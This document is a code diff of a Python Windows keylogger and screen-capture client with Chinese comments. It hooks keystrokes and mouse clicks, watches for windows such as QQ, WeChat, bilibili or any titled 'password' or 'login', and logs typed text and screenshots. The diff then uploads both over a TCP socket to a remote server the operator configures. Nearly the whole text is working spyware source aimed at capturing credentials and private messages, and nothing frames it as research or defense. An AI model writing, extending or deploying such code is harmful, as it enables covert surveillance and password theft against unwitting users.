@@ -8,21 +8,108 @@ from PIL import ImageGrab
 
 #------我们用关键词去筛选，软件会在什么时候去监听记录截屏
 lists=['百度','QQ','哔哩哔哩','微博','微信','密码','password','账号','account','login','kali linux','bilibili']
-
 MSG=""
 save_to=1
 title_word=""
 global_title=""
-rADDR=""
 runstatus=1
-BUFSIZE=1024
-set_encoding="utf-8"
 clientSockfd=""
-open_filename='D:/QQdata/data/Monitor.txt'
-dos_filename='D:\\QQdata\\data\\Monitor.txt'
-dos_pic_dir='D:\\QQdata\\data\\xx11\\'
+fname_to=""
+timelist=[0,0,100,100]
 #上面都是全局变量，由于初版本比较早完成，所以大部分都是使用全局变量请谅解。
 
+def init_setting():
+    pathlist={'open_filename':'', 'open_pic':'', 'dos_filename':'',
+            'dos_pic_dir':'', 'dos_config':'', 'open_config':''}
+    ADDRlist={'rADDR':(), 'rHOST':'','rPORT':0, 'picSIZE':0, 'txtSIZE':0, 'encode':''}
+
+    #--------------发包收包编码和BUFSIZE(缓存大小)--------------------------
+    ADDRlist['picSIZE'],ADDRlist['txtSIZE']=2048,256 #图片为4096,文本为256
+    ADDRlist['encode']='utf-8'
+
+    #-------------建立目录和文件信息-----------------------------
+    lhome=os.path.abspath('.')
+    lhomelist=lhome.split('\\')
+    pathlist['dos_filename']=lhome+'\\QQdata\\data\\Monitor_log.txt'
+    pathlist['dos_pic_dir']=lhome+'\\QQdata\\data\\xx11\\'
+    pathlist['dos_config']=lhome+'\\'+'Monitor_config.txt'
+    for n in range(len(lhomelist)):
+        pathlist['open_filename']+=lhomelist[n]+'/'
+        pathlist['open_pic']+=lhomelist[n]+'/'
+        pathlist['open_config']+=lhomelist[n]+'/'
+    pathlist['open_filename']+='QQdata/data/Monitor_log.txt'
+    pathlist['open_pic']+='QQdata/data/xx11/'
+    pathlist['open_config']+='Monitor_config.txt'
+
+    #-----手动修改Monitor_config.txt文件，如果有配置文件则不需要重复输入IP和端口号
+    #----把服务端的配置文件放在客户端同个目录也可，如果配置错误则需要手动删除配置文件。
+    if not os.path.exists(pathlist['dos_config']):
+        print('未检测出客户端配置文件,请输入新配置信息..........')
+        while True:
+            if ADDRlist['rHOST'] and ADDRlist['rPORT']:
+                break
+            if not ADDRlist['rHOST']:
+                try:
+                    ADDRlist['rHOST']=input('请输入正确的服务器IP地址(如www.xxx.com,xxx.xxx.xxx.xxx):')
+                except:
+                    print('错误IP格式')
+            if not ADDRlist['rPORT']:
+                try:
+                    ADDRlist['rPORT']=input('请输入正确的服务器端口推荐(6666):')
+                except:
+                    print('错误端口')
+        ADDRlist['rADDR']=(str(ADDRlist['rHOST']),int(ADDRlist['rPORT']))
+        f=open(pathlist['open_config'],'w')
+        f.write(ADDRlist['rHOST']+'\x0A'+ADDRlist['rPORT'])
+        f.close()
+        print('已成功生成新客户端配置文件......')
+    else:
+        f=open(pathlist['open_config'], 'r')
+        ff=f.read().split()
+        ADDRlist['rHOST'],ADDRlist['rPORT']=ff[0],ff[1]
+        ADDRlist['rADDR']=(str(ADDRlist['rHOST']),int(ADDRlist['rPORT']))
+        f.close()
+        print('已存在客户端配置文件，已成功加载配置信息......')
+    print('正在生成配置文件')
+    times=0
+    while True:
+        times+=1
+        if os.path.exists(pathlist['dos_filename']) and os.path.exists(pathlist['dos_pic_dir']):
+            print('成功生成目录数据变量')
+            break
+        elif times >=5:
+            pathlist['open_filename']='D:/QQdata/data/Monitor_log.txt'
+            pathlist['open_pic']='D:/QQdata/data/xx11/'
+            pathlist['dos_filename']='D:\\QQdata\\data\\Monitor_log.txt'
+            pathlist['dos_pic_dir']='D:\\QQdata\\data\\xx11\\'
+            print('已经配置默认条件......')
+            break
+
+        if not os.path.exists(pathlist['dos_pic_dir']):
+            try:
+                os.makedirs(pathlist['dos_pic_dir'])
+                print('正在生成%s目录' %pathlist['dos_pic_dir'])
+            except:
+                print('error1>>')
+        if not os.path.exists(pathlist['dos_filename']):
+            try:
+                os.system('type nul >%s' %pathlist['dos_filename'])
+                print('正在生成%s文件' %pathlist['dos_filename'])
+            except:
+                print('error2>>')
+    return pathlist, ADDRlist
+
+def runtime(event_time, timelist, status):
+    timelist[0]=event_time
+    if timelist[0]>timelist[1] and timelist[1]!=0:
+        if status=='keyboard':
+            timelist[2]+=(timelist[0]-timelist[1])/10**3
+        elif status=='mouse':
+            timelist[3]+=(timelist[0]-timelist[1])/10**3
+    timelist[1]=timelist[0]
+    return True
+
+"""
 def checkfile(file_name, i, BUFSIZE):
 #检测传输数据包的完整性
     j,rate=0,0
@@ -35,66 +122,70 @@ def checkfile(file_name, i, BUFSIZE):
         rate,j=100,fsize
     #返回目前包的大小和完成率
     return j,rate
+"""
 
-def sendfile(clientSockfd, file_name, set_encoding, BUFSIZE):
+def sendfile(clientSockfd, file_name, encode, BUFSIZE):
 #发送数据包函数到服务端
+    #global fname_to
     i=0
     f=open(file_name, 'rb')
     while True:
         msg=f.read(BUFSIZE)
         if not msg:
-            print('读取空包')
             break
+        """
         else:
             i+=1
             j,rate=checkfile(file_name,i,BUFSIZE)
-            print('正在发送',file_name,'数据包完整性：{}% 大小{}B{}'.format(rate,j,'\x0D'), end='')
-            #这里为了演示动态传输效果设置了时间延迟，建议注释不然会影响速度和造成卡顿
-#            time.sleep(0.0001)
+            print('正在发送',fname_to,'数据包完整性：{}% 大小{}B{}'.format(rate,j,'\x0D'), end='')
+            这里为了演示动态传输效果设置了时间延迟，建议注释不然会影响速度和造成卡顿
+            time.sleep(0.01)
+            """
         clientSockfd.sendall(msg)
     f.close()
-    clientSockfd.sendall(bytes('EOF',encoding=set_encoding))
-    print('{} 成功发包'.format(file_name))
-    print(recv_message(clientSockfd, set_encoding, BUFSIZE))
+    clientSockfd.sendall(bytes('EOF',encoding=encode))
+    print('成功发包')
+    #print(recv_message(clientSockfd, encode, BUFSIZE))
 
-def recv_message(clientSockfd,set_encoding,BUFSIZE):
+"""
+def recv_message(clientSockfd,encode,BUFSIZE):
 #接收数据包并返回其内容，可用于后期远程控制。
     msg=clientSockfd.recv(BUFSIZE)
-    if not msg or msg==bytes('EOF',encoding=set_encoding):
+    if not msg or msg==bytes('EOF',encoding=encode):
         return False
-    return msg
+    return msg.decode()
+    """
 
-def confirm(clientSockfd, filetype, set_encoding, BUFSIZE):
+def confirm(clientSockfd, filetype, encode, BUFSIZE):
 #确认数据包类型函数
-    clientSockfd.send(bytes(filetype, encoding=set_encoding))
+    clientSockfd.send(bytes(filetype, encoding=encode))
     msg=clientSockfd.recv(BUFSIZE)
-    if msg==bytes('NO PROBLEM', encoding=set_encoding):
+    if msg==bytes('NO PROBLEM', encoding=encode):
         print('{} NO PROBLEM'.format(filetype))
-        return True
+    return True
 
-def handle(clientSockfd, filename, filetype, set_encoding, BUFSIZE):
+def handle(clientSockfd, filename, filetype, encode, BUFSIZE):
 #客户端握手函数
+    #global MSG
     if filetype=='txt' or filetype=='pic':
         #当发现文件类型为文本或图片就会调用下面确认类型函数。
-        if confirm(clientSockfd, filetype, set_encoding, BUFSIZE):
+        if confirm(clientSockfd, filetype, encode, BUFSIZE):
             #如果是成功接收数据包NO PROBLEM则会发送全部数据，也是socket的核心函数集
-            sendfile(clientSockfd, filename, set_encoding, BUFSIZE)
+            sendfile(clientSockfd, filename, encode, BUFSIZE)
+            #if filetype=='txt':
+                #fname_to=MSG
         else:
             print('{} 发包失败'.format(filetype))
+            return False
     else:
         print('文件类型识别失败！')
+        return False
+    return True
 
-def write_msg_to_txt(msg, filetype):
-    #global是全局变量的意思，如果不带入global则无法通用
-    global clientSockfd
-    global set_encoding
-    global BUFSIZE
-    global open_filename
-
-    f=open(open_filename,'w')
+def write_msg_to_txt(msg, pathlist):
+    f=open(pathlist['open_filename'],'w')
     f.write(msg+'\x0A')
     f.close()
-    handle(clientSockfd, open_filename, filetype, set_encoding, BUFSIZE)
 
 def get_local_time(press):
 #获取时间函数
@@ -103,20 +194,19 @@ def get_local_time(press):
     else:
         return time.strftime('%Y-%m-%d_%Hh%Mm%Ss', time.localtime(time.time()))
 
-def get_local_image(dos_pic_dir):
+def get_local_image(pathlist):
 #获取截屏并生成当前时间格式存储本地
-    global clientSockfd
-    global BUFSIZE
-
-    pic_lists =os.listdir(dos_pic_dir)
+    #global fname_to
+    pic_lists =os.listdir(pathlist['dos_pic_dir'])
     #检测客户端本地存储超过一百张则全部清空
-    if len(pic_lists) >100:
+    if len(pic_lists) >10:
         for pl in pic_lists:
-            fpath=dos_pic_dir+pl
+            fpath=pathlist['dos_pic_dir']+pl
             if os.path.isfile(fpath):
                 os.remove(fpath)
     pic=ImageGrab.grab()
-    pic_name='D:/QQdata/data/xx11/mouse_%s.jpg' %get_local_time("")
+    pic_name=pathlist['open_pic']+'mouse_%s.jpg' %get_local_time("")
+    #fname_to='mouse_%s.jpg' %get_local_time("")
     pic.save('%s' %pic_name)
     return pic_name
 
@@ -125,18 +215,24 @@ def onMouseEvent(event):
     global lists
     global MSG
     global global_title
-    global dos_pic_dir
+    global pathlist
+    global timelist
 
     mouse_status=event.MessageName
+    if timelist[3]<5:
+        runtime(event.Time, timelist, 'mouse')
     pic_msg=""
     #当鼠标左键和右键点击的时候回触发,下面截屏和键盘记录函数
     if mouse_status=="mouse left down" or mouse_status=="mouse right down":
         if global_title in lists:
-            if MSG!="":
-                write_msg_to_txt(MSG, 'txt')
-                pic_msg=get_local_image(dos_pic_dir)
-                write_msg_to_txt(pic_msg, 'txt')
-                handle(clientSockfd, pic_msg, 'pic', set_encoding, BUFSIZE)
+            if MSG!="" and int(timelist[3])>=5:
+                write_msg_to_txt(MSG, pathlist)
+                handle(clientSockfd, pathlist['open_filename'], 'txt', ADDRlist['encode'], ADDRlist['txtSIZE'])
+                get_local_image(pathlist)
+                pic_msg=get_local_image(pathlist)
+                #write_msg_to_txt(pic_msg, pathlist)
+                handle(clientSockfd, pic_msg, 'pic', ADDRlist['encode'], ADDRlist['picSIZE'])
+                timelist[3]=0
             global_title=""
     return True
 
@@ -146,6 +242,11 @@ def onKeyboardEvent(event):
     global MSG
     global title_word
     global global_title
+    global pathlist
+    global timelist
+
+    words,title='',''
+    status, title_status, break_status=1,1,1
 
     #当前监控的的Ascii十进制数值
     keyid=event.Ascii
@@ -155,11 +256,9 @@ def onKeyboardEvent(event):
     keyword=event.Key
     #当前窗口如QQ或bilibili的名称
     title=event.WindowName
-
-    words=''
-    status=1
-    title_status=1
-    break_status=1
+    #事件发生的时间戳，通过函数计算时间秒速,并将值赋予timelist[2]
+    if timelist[2]<5:
+        runtime(event.Time, timelist, 'keyboard')
 
     if len(title) >0:
         for n in range(len(lists)):
@@ -196,10 +295,12 @@ def onKeyboardEvent(event):
                 MSG+="<删除>"
             elif keyword=="Space":
                 MSG+="<空格>"
-    if status == 0:
+    if status == 0 and int(timelist[2])>=5:
         if MSG!="":
             #当触发如回车或者一些特殊按键时候则触发记录
-            write_msg_to_txt(MSG, 'txt')
+            write_msg_to_txt(MSG, pathlist)
+            handle(clientSockfd, pathlist['open_filename'], 'txt', ADDRlist['encode'], ADDRlist['txtSIZE'])
+            timelist[2]=0
         title_word=""
         global_title=""
         kwords=""
@@ -207,58 +308,13 @@ def onKeyboardEvent(event):
     return True
 
 def main():
-    global rADDR
     global runstatus
     global clientSockfd
-    global dos_pic_dir
-    global dos_filename
+    global pathlist
+    global ADDRlist
 
     print('正在检测配置文件{}'.format('.'*4))
-    current_path=os.path.abspath('.')
-    config_name='Monitor_config.txt'
-    config_file=current_path+'\\'+config_name
-
-    #-----手动修改Monitor_config.txt文件，如果有配置文件则不需要重复输入IP和端口号
-    #----把服务端的配置文件放在客户端同个目录也可，如果配置错误则需要手动删除配置文件。
-    if not os.path.exists(config_file):
-        HOST,PORT='',0
-        while True:
-            if HOST and PORT:
-                break
-            if not HOST:
-                try:
-                    HOST=input('请输入正确的服务器IP地址(如www.xxx.com,xxx.xxx.xxx.xxx):')
-                except:
-                    print('错误IP格式')
-            if not PORT:
-                try:
-                    PORT=input('请输入正确的服务器端口推荐(6666):')
-                except:
-                    print('错误端口')
-        rADDR=(HOST,int(PORT))
-        f=open(config_file,'w')
-        f.write(HOST+'\x0A'+PORT)
-        f.close()
-    else:
-        f=open(config_file, 'r')
-        ff=f.read().split()
-        HOST,PORT=ff[0],ff[1]
-        lADDR=(HOST,int(PORT))
-
-    times=0
-    print('正在布置环境........')
-    while True:
-        times+=1
-        if os.path.exists(dos_filename)==True and os.path.exists(dos_pic_dir):
-            print('成功创建{}和{}'.format(dos_pic_dir,dos_filename))
-            break
-        elif times>=5:
-            print('无法成功创建{}和{}'.format(dos_pic_dir,dos_filename))
-            print('请手动创建，或管理权限执行。')
-            sys.exit()
-        os.system('mkdir %s >nul' %dos_pic_dir)
-        os.system('type nul > %s' %dos_filename)
-
+    pathlist, ADDRlist=init_setting()
     times=0
     print('正在连接服务器......')
     while True:
@@ -274,12 +330,12 @@ def main():
                 #客户端数字传输类型ip4和TCP
                 clientSockfd=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 #连接服务器
-                clientSockfd.connect(rADDR)
-                print("已建立连接{}".format('.'*10),rADDR)
+                clientSockfd.connect(ADDRlist['rADDR'])
+                print("已建立连接{}".format('.'*10),ADDRlist['rADDR'])
                 runstatus=0
                 break
             except socket.error:
-                print('无法正常连接:{}，错误:请检查服务器是否开启!!!'.format(str(rADDR)))
+                print('无法正常连接:{}，错误:请检查服务器是否开启!!!'.format(str(ADDRlist['rADDR'])))
         else:
             time.sleep(1)
     if runstatus==0:
